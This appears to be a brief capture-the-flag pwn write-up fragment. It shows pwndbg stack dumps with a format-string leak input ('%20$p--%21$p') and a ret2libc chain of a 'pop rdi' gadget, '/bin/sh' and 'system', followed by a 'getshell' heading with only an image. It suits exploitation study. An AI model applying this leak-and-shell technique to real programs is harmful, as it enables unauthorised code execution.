# debug
```
0c:0060│ rdi 0x7ffe5e8bf690 ◂— '%20$p--%21$p\n'
0d:0068│-008 0x7ffe5e8bf698 ◂— 0xa70243132 /* '21$p\n' */
0e:0070│ rbp 0x7ffe5e8bf6a0 —▸ 0x7ffe5e8bf740 —▸ 0x7ffe5e8bf7a0 ◂— 0
0f:0078│+008 0x7ffe5e8bf6a8 —▸ 0x7f2a546f11ca (__libc_start_call_main+122) ◂— mov edi, eax

```

```
pwndbg> stack
00:0000│ rsp     0x7ffdb03e6760 ◂— 1
01:0008│-018     0x7ffdb03e6768 ◂— 0x8800000000000000
02:0010│-010     0x7ffdb03e6770 —▸ 0x7ffdb03e6780 —▸ 0x7ffdb03e6800 —▸ 0x7ffdb03e68a0 —▸ 0x7ffdb03e6900 ◂— ...
03:0018│-008     0x7ffdb03e6778 ◂— 0xa40e95000
04:0020│ rax rbp 0x7ffdb03e6780 —▸ 0x7ffdb03e6800 —▸ 0x7ffdb03e68a0 —▸ 0x7ffdb03e6900 ◂— 0
05:0028│+008     0x7ffdb03e6788 —▸ 0x401384 (main+297) ◂— mov eax, 0
06:0030│+010     0x7ffdb03e6790 —▸ 0x7f2340d5875b (__spawnix+875) ◂— pop rdi
07:0038│+018     0x7ffdb03e6798 —▸ 0x7f2340e1442f ◂— 0x68732f6e69622f /* '/bin/sh' */
pwndbg>
08:0040│+020 0x7ffdb03e67a0 —▸ 0x7f2340ca1750 (system) ◂— endbr64
09:0048│+028 0x7ffdb03e67a8 ◂— 0xa /* '\n' */
0a:0050│+030 0x7ffdb03e67b0 ◂— 0
... ↓     5 skipped

```
![](https://r2.20161023.xyz/pic/20250922102042450.png)


# getshell

![](https://r2.20161023.xyz/pic/20250922101945409.png)